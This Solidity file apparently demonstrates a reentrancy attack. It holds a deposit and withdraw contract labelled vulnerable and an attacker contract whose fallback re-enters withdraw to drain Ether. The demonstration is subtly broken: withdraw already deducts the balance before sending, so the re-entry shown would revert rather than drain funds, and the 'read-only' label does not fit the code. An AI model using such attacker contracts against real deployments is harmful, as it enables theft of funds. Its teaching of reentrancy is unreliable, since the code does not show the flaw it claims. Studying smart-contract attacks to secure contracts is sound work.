// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableReadOnly {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function isBalanceSufficient(address _user, uint256 _amount) public view returns (bool) {
        return balances[_user] >= _amount;
    }

    function withdraw(uint256 _amount) external {
        require(isBalanceSufficient(msg.sender, _amount), "Insufficient balance");
        balances[msg.sender] -= _amount;
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }
}

contract AttackerReadOnly {
    VulnerableReadOnly public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableReadOnly(_vulnerableContract);
    }

    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw(1 ether);
    }
}
